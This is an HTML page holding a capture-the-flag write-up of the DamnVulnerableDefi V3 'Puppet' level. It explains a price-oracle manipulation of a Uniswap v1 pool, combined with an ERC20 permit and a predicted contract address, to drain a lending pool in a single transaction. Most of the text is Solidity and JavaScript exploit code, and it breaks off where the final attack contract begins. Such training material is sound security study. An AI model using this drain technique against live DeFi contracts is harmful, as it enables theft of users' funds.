@@ -1,0 +1,846 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+  
+  
+  
+
+    <title>Puppet Writeup - DamnVulnerableDefi V3 :: teddyctf</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Writeup for Puppet (Level 8) from DamnVulnerableDefi V3, " />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://TheSavageTeddy.github.io/posts/puppet-damnvulnerabledefi/" />
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-J6PB683BSR"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-J6PB683BSR', { 'anonymize_ip': false });
+}
+</script>
+
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="https://TheSavageTeddy.github.io/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="https://TheSavageTeddy.github.io/favicon.ico">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="teddyctf" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Puppet Writeup - DamnVulnerableDefi V3">
+<meta property="og:description" content="Writeup for Puppet (Level 8) from DamnVulnerableDefi V3, " />
+<meta property="og:url" content="https://TheSavageTeddy.github.io/posts/puppet-damnvulnerabledefi/" />
+<meta property="og:site_name" content="teddyctf" />
+
+  
+    <meta property="og:image" content="https://TheSavageTeddy.github.io/favicon.ico">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+  <meta property="article:section" content="writeups" />
+
+  <meta property="article:section" content="web3" />
+
+
+  <meta property="article:published_time" content="2024-02-11 09:30:00 &#43;0800 AWST" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner" style="height: 34px;">
+    <img src="/images/teddypfp.jpg" style="max-height: 100%; max-width: 100%; display: block;">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    teddy / TheSavageTeddy
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/contact">Contact</a></li>
+        
+      
+        
+          <li><a href="/featured">Featured Posts</a></li>
+        
+      
+        
+          <li><a href="/posts">Other Posts</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          
+            <li><a href="/about">About</a></li>
+          
+        
+      
+        
+          
+            <li><a href="/contact">Contact</a></li>
+          
+        
+      
+        
+          
+            <li><a href="/featured"><b>Featured Posts</b></a></li>
+          
+        
+      
+        
+          
+            <li><a href="/posts">Other Posts</a></li>
+          
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="https://TheSavageTeddy.github.io/posts/puppet-damnvulnerabledefi/"> Puppet Writeup - DamnVulnerableDefi V3</a>
+  </h1>
+  <div class="post-meta">
+    
+      <time class="post-date">
+        Feb 11, 2024 :: teddyctf
+        
+      </time>
+    
+    
+    
+  </div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="https://TheSavageTeddy.github.io/tags/web3/">web3</a>&nbsp;
+      
+      #<a href="https://TheSavageTeddy.github.io/tags/solidity/">solidity</a>&nbsp;
+      
+      #<a href="https://TheSavageTeddy.github.io/tags/writeup/">writeup</a>&nbsp;
+      
+      #<a href="https://TheSavageTeddy.github.io/tags/damnvulnerabledefi/">damnvulnerabledefi</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p>This post contains the walkthrough and solutions for <a href="https://www.damnvulnerabledefi.xyz/challenges/puppet/">Puppet</a>, a challenge from the <a href="https://www.damnvulnerabledefi.xyz">DamnVulnerableDefi</a> wargame, featuring a price oracle manipulation vulnerability.</p>
+<h4 id="but-wait-why-another-writeup">But wait, why another writeup?<a href="#but-wait-why-another-writeup" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>You may be wondering why I’m making a writeup for this challenge, when there are already tons of other writeups online. Well, many of the writeups online <strong>don&rsquo;t actually solve the challenge properly</strong>.</p>
+<p>There was a new solve condition added in V3 of DamnVulnerableDefi, which required you, the attacker (<code>player</code>) to only make 1 transaction total.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">expect</span>(<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">provider</span>.<span style="color:#a6e22e">getTransactionCount</span>(<span style="color:#a6e22e">player</span>.<span style="color:#a6e22e">address</span>)).<span style="color:#a6e22e">to</span>.<span style="color:#a6e22e">eq</span>(<span style="color:#ae81ff">1</span>);
+</span></span></code></pre></div><p>A lot of these online writeups didn&rsquo;t account for this and hence made <strong>multiple transactions</strong>. Their test script still shows that they passed the challenge, but this is because they might have simply created another account to run the attacks, or omitted <code>.connect(player)</code> for some of the transactions, causing Hardhat to use the default account <code>deployer</code>, both of which is not really solving the challenge properly.</p>
+<p>Executing the entire exploit in 1 transaction resulted in the challenge being a bit trickier, which we will explore in this post.</p>
+<h1 id="challenge-overview">Challenge Overview<a href="#challenge-overview" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Challenge Description:</p>
+<blockquote>
+<p>There’s a lending pool where users can borrow Damn Valuable Tokens (DVTs). To do so, they first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.
+<br>
+<br>
+There’s a DVT market opened in an old <a href="https://docs.uniswap.org/contracts/v1/overview">Uniswap v1 exchange</a>, currently with 10 ETH and 10 DVT in liquidity.
+<br>
+<br>
+Pass the challenge by taking all tokens from the lending pool. You start with 25 ETH and 1000 DVTs in balance.</p>
+</blockquote>
+<p>We are given source code of the lending pool, the DVT, and the test file:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="1" type="checkbox" checked />
+    <label for="1">
+      <span class="collapsable-code__language">solidity</span>
+      <span class="collapsable-code__title">PuppetPool.sol</span>
+      <span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide"></span>
+    </label>
+    <pre class="language-solidity" ><code>
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import &#34;@openzeppelin/contracts/security/ReentrancyGuard.sol&#34;;
+import &#34;@openzeppelin/contracts/utils/Address.sol&#34;;
+import &#34;../DamnValuableToken.sol&#34;;
+
+/**
+ * @title PuppetPool
+ * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
+ */
+contract PuppetPool is ReentrancyGuard {
+    using Address for address payable;
+
+    uint256 public constant DEPOSIT_FACTOR = 2;
+
+    address public immutable uniswapPair;
+    DamnValuableToken public immutable token;
+
+    mapping(address =&gt; uint256) public deposits;
+
+    error NotEnoughCollateral();
+    error TransferFailed();
+
+    event Borrowed(address indexed account, address recipient, uint256 depositRequired, uint256 borrowAmount);
+
+    constructor(address tokenAddress, address uniswapPairAddress) {
+        token = DamnValuableToken(tokenAddress);
+        uniswapPair = uniswapPairAddress;
+    }
+
+    // Allows borrowing tokens by first depositing two times their value in ETH
+    function borrow(uint256 amount, address recipient) external payable nonReentrant {
+        uint256 depositRequired = calculateDepositRequired(amount);
+
+        if (msg.value &lt; depositRequired)
+            revert NotEnoughCollateral();
+
+        if (msg.value &gt; depositRequired) {
+            unchecked {
+                payable(msg.sender).sendValue(msg.value - depositRequired);
+            }
+        }
+
+        unchecked {
+            deposits[msg.sender] &#43;= depositRequired;
+        }
+
+        // Fails if the pool doesn&#39;t have enough tokens in liquidity
+        if(!token.transfer(recipient, amount))
+            revert TransferFailed();
+
+        emit Borrowed(msg.sender, recipient, depositRequired, amount);
+    }
+
+    function calculateDepositRequired(uint256 amount) public view returns (uint256) {
+        return amount * _computeOraclePrice() * DEPOSIT_FACTOR / 10 ** 18;
+    }
+
+    function _computeOraclePrice() private view returns (uint256) {
+        // calculates the price of the token in wei according to Uniswap pair
+        return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
+    }
+}
+</code></pre>
+  </div>
+
+
+
+
+
+  <div class="collapsable-code">
+    <input id="100" type="checkbox" checked />
+    <label for="100">
+      <span class="collapsable-code__language">solidity</span>
+      <span class="collapsable-code__title">DamnValuableToken.sol</span>
+      <span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide"></span>
+    </label>
+    <pre class="language-solidity" ><code>
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import &#34;solmate/src/tokens/ERC20.sol&#34;;
+
+/**
+ * @title DamnValuableToken
+ * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
+ */
+contract DamnValuableToken is ERC20 {
+    constructor() ERC20(&#34;DamnValuableToken&#34;, &#34;DVT&#34;, 18) {
+        _mint(msg.sender, type(uint256).max);
+    }
+}
+</code></pre>
+  </div>
+
+
+
+
+
+  <div class="collapsable-code">
+    <input id="2" type="checkbox" checked />
+    <label for="2">
+      <span class="collapsable-code__language">javascript</span>
+      <span class="collapsable-code__title">puppet.challenge.js</span>
+      <span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide"></span>
+    </label>
+    <pre class="language-javascript" ><code>
+const exchangeJson = require(&#34;../../build-uniswap-v1/UniswapV1Exchange.json&#34;);
+const factoryJson = require(&#34;../../build-uniswap-v1/UniswapV1Factory.json&#34;);
+
+const { ethers } = require(&#39;hardhat&#39;);
+const { expect } = require(&#39;chai&#39;);
+const { setBalance } = require(&#34;@nomicfoundation/hardhat-network-helpers&#34;);
+
+// Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
+function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
+    return (tokensSold * 997n * etherInReserve) / (tokensInReserve * 1000n &#43; tokensSold * 997n);
+}
+
+describe(&#39;[Challenge] Puppet&#39;, function () {
+    let deployer, player;
+    let token, exchangeTemplate, uniswapFactory, uniswapExchange, lendingPool;
+
+    const UNISWAP_INITIAL_TOKEN_RESERVE = 10n * 10n ** 18n;
+    const UNISWAP_INITIAL_ETH_RESERVE = 10n * 10n ** 18n;
+
+    const PLAYER_INITIAL_TOKEN_BALANCE = 1000n * 10n ** 18n;
+    const PLAYER_INITIAL_ETH_BALANCE = 25n * 10n ** 18n;
+
+    const POOL_INITIAL_TOKEN_BALANCE = 100000n * 10n ** 18n;
+
+    before(async function () {
+        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
+        [deployer, player] = await ethers.getSigners();
+
+        const UniswapExchangeFactory = new ethers.ContractFactory(exchangeJson.abi, exchangeJson.evm.bytecode, deployer);
+        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.evm.bytecode, deployer);
+        
+        setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
+        expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);
+
+        // Deploy token to be traded in Uniswap
+        token = await (await ethers.getContractFactory(&#39;DamnValuableToken&#39;, deployer)).deploy();
+
+        // Deploy a exchange that will be used as the factory template
+        exchangeTemplate = await UniswapExchangeFactory.deploy();
+
+        // Deploy factory, initializing it with the address of the template exchange
+        uniswapFactory = await UniswapFactoryFactory.deploy();
+        await uniswapFactory.initializeFactory(exchangeTemplate.address);
+
+        // Create a new exchange for the token, and retrieve the deployed exchange&#39;s address
+        let tx = await uniswapFactory.createExchange(token.address, { gasLimit: 1e6 });
+        const { events } = await tx.wait();
+        uniswapExchange = await UniswapExchangeFactory.attach(events[0].args.exchange);
+
+        // Deploy the lending pool
+        lendingPool = await (await ethers.getContractFactory(&#39;PuppetPool&#39;, deployer)).deploy(
+            token.address,
+            uniswapExchange.address
+        );
+    
+        // Add initial token and ETH liquidity to the pool
+        await token.approve(
+            uniswapExchange.address,
+            UNISWAP_INITIAL_TOKEN_RESERVE
+        );
+        await uniswapExchange.addLiquidity(
+            0,                                                          // min_liquidity
+            UNISWAP_INITIAL_TOKEN_RESERVE,
+            (await ethers.provider.getBlock(&#39;latest&#39;)).timestamp * 2,   // deadline
+            { value: UNISWAP_INITIAL_ETH_RESERVE, gasLimit: 1e6 }
+        );
+        
+        // Ensure Uniswap exchange is working as expected
+        expect(
+            await uniswapExchange.getTokenToEthInputPrice(
+                10n ** 18n,
+                { gasLimit: 1e6 }
+            )
+        ).to.be.eq(
+            calculateTokenToEthInputPrice(
+                10n ** 18n,
+                UNISWAP_INITIAL_TOKEN_RESERVE,
+                UNISWAP_INITIAL_ETH_RESERVE
+            )
+        );
+        
+        // Setup initial token balances of pool and player accounts
+        await token.transfer(player.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        await token.transfer(lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);
+
+        // Ensure correct setup of pool. For example, to borrow 1 need to deposit 2
+        expect(
+            await lendingPool.calculateDepositRequired(10n ** 18n)
+        ).to.be.eq(2n * 10n ** 18n);
+
+        expect(
+            await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
+        ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE * 2n);
+    });
+
+    it(&#39;Execution&#39;, async function () {
+        /** CODE YOUR SOLUTION HERE */
+    });
+
+    after(async function () {
+        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
+        // Player executed a single transaction
+        expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);
+        
+        // Player has taken all tokens from the pool       
+        expect(
+            await token.balanceOf(lendingPool.address)
+        ).to.be.eq(0, &#39;Pool still has tokens&#39;);
+
+        expect(
+            await token.balanceOf(player.address)
+        ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE, &#39;Not enough token balance in player&#39;);
+    });
+});
+</code></pre>
+  </div>
+
+
+<p>Looking at the challenge description and source code, we can see that the target contract <code>PuppetPool</code> has <code>100000</code> DVTs (Damn Vulnerable Tokens) available for us to borrow. To borrow the DVTs, we need to provide 2 times the value in ETH as collateral. But how does the contract determine the value of DVT/ETH?</p>
+<p>The function <code>calculateDepositRequired(uint256 amount)</code> returns the amount of ETH required to borrow <code>amount</code> tokens. This function calls <code>_computeOraclePrice()</code> which queries a Uniswap V1 exchange with 10 ETH and 10 DVT in liquidity. We start with <code>25</code> ETH and <code>1000</code> DVTs.</p>
+<h1 id="price-oracle-manipulation">Price Oracle Manipulation<a href="#price-oracle-manipulation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>We have much more ETH and DVT than the Uniswap exchange, which we can abuse to manipulate the price of DVT/ETH. For example, if we exchange all <code>1000</code> of our DVTs for ETH in the Uniswap exchange, it will drastically increase the supply of DVTs, and reduce the supply of ETH, inflating the price of ETH.</p>
+<p>Let&rsquo;s say we swap <code>1000</code> DVT for <code>9.9</code> ETH. The Uniswap exchange will have <code>1010</code> DVT and <code>0.1</code> ETH left, and now reports a price of roughly <code>1</code> ETH per <code>10100</code> DVT. As the lending pool relies on this Uniswap exchange for the price of DVT, it will use this pricing for the collateral, and we can borrow <code>100000</code> DVT for around <code>20</code> ETH (providing 2 times ETH for collateral), draining the pool and solving the challenge.</p>
+<p>We write a quick proof of concept to see this working in action:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="3" type="checkbox" checked />
+    <label for="3">
+      <span class="collapsable-code__language">javascript</span>
+      <span class="collapsable-code__title">puppet.challenge.js</span>
+      <span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide"></span>
+    </label>
+    <pre class="language-javascript" ><code>
+it(&#39;Execution&#39;, async function () {
+    /** CODE YOUR SOLUTION HERE */
+
+    console.log(&#34;=== Initial balances &amp; prices ===&#34;)
+    console.log(`ETH balance: ${await ethers.provider.getBalance(player.address) / (10**18)}`)
+    console.log(`DVT balance: ${await token.connect(player).balanceOf(player.address) / (10**18)}`)
+    console.log(`Price of 1000 DVT: ${
+        await lendingPool.connect(player).calculateDepositRequired(1000n * 10n**18n) / (10**18)
+    } ETH`)
+    // approve uniswapExchange to use our DVTs
+    await token.connect(player).approve(uniswapExchange.address, PLAYER_INITIAL_TOKEN_BALANCE)
+    // swap our DVTs for ETH
+    await uniswapExchange.connect(player).tokenToEthSwapInput(
+        PLAYER_INITIAL_TOKEN_BALANCE, // swapping 10000 DVTs
+        99n * 10n**17n, // for 9.9 ETH minimum
+        (await ethers.provider.getBlock(&#39;latest&#39;)).timestamp &#43; 3600 // deadline (not important)
+    )
+    console.log(&#34;=== After manipulation ===&#34;)
+    console.log(`ETH: ${await ethers.provider.getBalance(player.address) / (10**18)}`)
+    console.log(`DVT: ${await token.connect(player).balanceOf(player.address) / (10**18)}`)
+    console.log(`Price of 1000 DVT: ${
+        await lendingPool.connect(player).calculateDepositRequired(1000n * 10n**18n) / (10**18)
+    } ETH`)
+
+});
+</code></pre>
+  </div>
+
+
+
+  <img src="./img/poc.png"  class="center"  style="border-radius: 5px; max-width: 80%;"  />
+
+
+<p><em>Small note: You can see I renamed the challenge &lsquo;Puppet v1&rsquo; as there are 2 other challenges named &lsquo;Puppet&rsquo; which also get ran if I use <code>--grep 'Puppet'</code></em></p>
+<p>As shown in the image, the price of DVT dropped significantly, allowing us to drain the lending pool with just 20 ETH (which we have enough of).</p>
+<p>However, if we do borrow the <code>100000</code> tokens and drain the lending pool, we still don&rsquo;t pass the challenge, because as discussed before, everything needs to be done in exactly 1 transaction:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;=== Borrowing 100000 DVTs ===&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">ethRequiredToDrain</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">lendingPool</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">player</span>).<span style="color:#a6e22e">calculateDepositRequired</span>(<span style="color:#ae81ff">100000</span><span style="color:#a6e22e">n</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">10</span><span style="color:#a6e22e">n</span><span style="color:#f92672">**</span><span style="color:#ae81ff">18</span><span style="color:#a6e22e">n</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">lendingPool</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">player</span>).<span style="color:#a6e22e">borrow</span>(
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">100000</span><span style="color:#a6e22e">n</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">10</span><span style="color:#a6e22e">n</span><span style="color:#f92672">**</span><span style="color:#ae81ff">18</span><span style="color:#a6e22e">n</span>, <span style="color:#75715e">// amount of DVT to borrow
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">player</span>.<span style="color:#a6e22e">address</span>, <span style="color:#75715e">// recipient of borrowed DVTs 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    {<span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">ethRequiredToDrain</span>} <span style="color:#75715e">// send ETH as collateral
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Player DVTs: </span><span style="color:#e6db74">${</span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">token</span>.<span style="color:#a6e22e">balanceOf</span>(<span style="color:#a6e22e">player</span>.<span style="color:#a6e22e">address</span>) <span style="color:#f92672">/</span> (<span style="color:#ae81ff">10</span><span style="color:#f92672">**</span><span style="color:#ae81ff">18</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Lending Pool DVTs: </span><span style="color:#e6db74">${</span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">token</span>.<span style="color:#a6e22e">balanceOf</span>(<span style="color:#a6e22e">lendingPool</span>.<span style="color:#a6e22e">address</span>) <span style="color:#f92672">/</span> (<span style="color:#ae81ff">10</span><span style="color:#f92672">**</span><span style="color:#ae81ff">18</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>)
+</span></span></code></pre></div>
+  <img src="./img/fail.png"  class="center"  style="border-radius: 5px; max-width: 80%;"  />
+
+
+<p>Solve requirement which is not met:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">expect</span>(<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">provider</span>.<span style="color:#a6e22e">getTransactionCount</span>(<span style="color:#a6e22e">player</span>.<span style="color:#a6e22e">address</span>)).<span style="color:#a6e22e">to</span>.<span style="color:#a6e22e">eq</span>(<span style="color:#ae81ff">1</span>);
+</span></span></code></pre></div><h1 id="everything-in-one-transaction">Everything in one transaction<a href="#everything-in-one-transaction" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Everything should be done with only the <code>player</code> account, so we shouldn&rsquo;t create another account just to bypass this condition.</p>
+<p>To perform all of these calls; swapping tokens with the Uniswap pool, then borrowing tokens from the lending pool, we can create a contract which <strong>executes everything in its constructor</strong>, using our 1 transaction to deploy the contract, sending all necessary ether along with it.</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="4" type="checkbox" checked />
+    <label for="4">
+      <span class="collapsable-code__language">solidity</span>
+      <span class="collapsable-code__title">PuppetAttack.sol</span>
+      <span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide"></span>
+    </label>
+    <pre class="language-solidity" ><code>
+contract PuppetAttack {
+    constructor (
+        address owner,
+        DamnValuableToken token,
+        PuppetPool lendingPool,
+        IUniswapExchange uniswapExchange
+    ) payable {
+        // swap all our DVTs for ETH
+        token.approve(address(uniswapExchange), value);
+        uniswapExchange.tokenToEthSwapInput(
+            1000 * 10**18, // swap 1000 DVT
+            9.9 * 10**18, // for 9.9 ETH minimum
+            block.timestamp &#43; 3600 // deadline (not important)
+        );
+
+        // drain lending pool&#39;s DVTs, sending them to owner (player)
+        uint256 lendingPoolBalance = token.balanceOf(address(lendingPool));
+        uint256 ethRequiredToDrain = lendingPool.calculateDepositRequired(
+            lendingPoolBalance
+        );
+        lendingPool.borrow{value: ethRequiredToDrain}(lendingPoolBalance, owner);
+    }
+}
+</code></pre>
+  </div>
+
+
+
+
+
+  <div class="collapsable-code">
+    <input id="5" type="checkbox" checked />
+    <label for="5">
+      <span class="collapsable-code__language">javascript</span>
+      <span class="collapsable-code__title">puppet.challenge.js</span>
+      <span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide"></span>
+    </label>
+    <pre class="language-javascript" ><code>
+it(&#39;Execution&#39;, async function () {
+    /** CODE YOUR SOLUTION HERE */
+
+    attack = await (await ethers.getContractFactory(&#39;PuppetAttack&#39;, player)).deploy(
+        player.address,
+        token.address,
+        lendingPool.address,
+        uniswapExchange.address,
+        {
+            // send most ETH to the attack contract, keeping some for gas
+            value: PLAYER_INITIAL_ETH_BALANCE - 1n * 10n**18n, 
+            gasLimit: 1e7
+        }
+    );
+});
+</code></pre>
+  </div>
+
+
+<p>The above code will fail, however, as there is a significant problem: for the attack contract to trade our DVTs, we need to allow our DVTs to be spent by the attack contract - how can we do this without using up another transaction?</p>
+<h1 id="erc20-permit-approvals">ERC20 Permit Approvals<a href="#erc20-permit-approvals" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>We can&rsquo;t simply <code>transfer</code> our tokens to the attack contract, or <code>approve</code> the attack contract to use our tokens, without a transaction.</p>
+<p>Fortunately if we look closer at the DVT contract, we notice it uses <a href="https://github.com/transmissions11/solmate/blob/main/src/tokens/ERC20.sol">solmate&rsquo;s ERC20 implementation</a>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#e6db74">&#34;solmate/src/tokens/ERC20.sol&#34;</span>;
+</span></span></code></pre></div><p>This particular implementation includes the <code>permit</code> function, which was designed as a gas efficient way to <code>approve</code> a spender. It is essentially an <a href="https://eips.ethereum.org/EIPS/eip-2612">extension to ERC20</a> to allow others to spend your tokens <strong>in a single transaction</strong>.</p>
+<p>For example, say you wish to exchange some tokens. Normally you would need to call <code>approve(exchange, amount)</code> to allow <code>exchange</code> to spend <code>amount</code> of your tokens, then the exchange can take your tokens by doing <code>transferFrom(you, exchange, amount)</code>. This requires a total of 2 transactions, one from you and one from the exchange. <strong>There is no way to do both in the same transaction</strong> (unless you are a contract).</p>
+<p>With <code>permit</code>, you can cryptographically sign a <code>Permit</code> which contains details such as the <code>spender</code> and <code>amount</code>, obtaining a signature. Then, you send this signature to the exchange, which calls <code>permit</code> on the token contract, approving <code>spender</code> to spend <code>amount</code> tokens. The key difference is that the signing is done off-chain, which means the exchange can <strong>obtain allowance to your tokens and spend them in the same transaction</strong>.</p>
+<p>This is perfect for our scenario, as our attacking contract cannot spend our DVTs without us sending or approving the DVTs first.</p>
+<h1 id="deterministic-contract-addresses">Deterministic Contract Addresses<a href="#deterministic-contract-addresses" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>There is another problem - we need to specify the <code>spender</code> when signing a permit off-chain - how do we get our attack contract&rsquo;s address before deploying it?</p>
+<p>We can actually predict the contract&rsquo;s address before its deployment, as <a href="https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed">contract addresses are deterministic</a>, based off the deploying account&rsquo;s address and nonce.</p>
+<p>In our case, since Hardhat tests use same account addresses, we can simply deploy and print out the attack contract&rsquo;s address, which will remain constant.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">it</span>(<span style="color:#e6db74">&#39;Execution&#39;</span>, <span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> () {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/** CODE YOUR SOLUTION HERE */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">attack</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> (<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">getContractFactory</span>(<span style="color:#e6db74">&#39;PuppetAttack&#39;</span>, <span style="color:#a6e22e">player</span>)).<span style="color:#a6e22e">deploy</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Attack contract: </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">attack</span>.<span style="color:#a6e22e">address</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>)
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">PuppetAttack</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Deploying an empty contract as shown above gives us the attack contract&rsquo;s address, which stays constant if we re-run the tests.</p>
+<pre tabindex="0"><code>Attack contract: 0x8464135c8F25Da09e49BC8782676a84730C318bC
+</code></pre><h1 id="putting-it-all-together">Putting it all together<a href="#putting-it-all-together" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Figuring out how to sign the permit probably took the longest for this challenge. I eventually found <a href="https://forum.openzeppelin.com/t/erc20-permit-call/34975">this thread</a> and modified the code to work. Afterwards I found <a href="https://github.com/dmihal/eth-permit"><code>eth-permit</code></a> which required less code, but requires installing another node module, so I will show the original way I used.</p>
+<p>Otherwise, most of the code is simply combining what was shown in the previous sections, with the addition of the permit.</p>
+<p>Final attack contract code:
+
+
+
+  <div class="collapsable-code">
+    <input id="300" type="checkbox" checked />
+    <label for="300">
+      <span class="collapsable-code__language">solidity</span>
+      <span class="collapsable-code__title">PuppetAttack.sol</span>
+      <span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide"></span>
+    </label>
+    <pre class="language-solidity" ><code>
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.0;
+
+import &#34;../DamnValuableToken.sol&#34;;
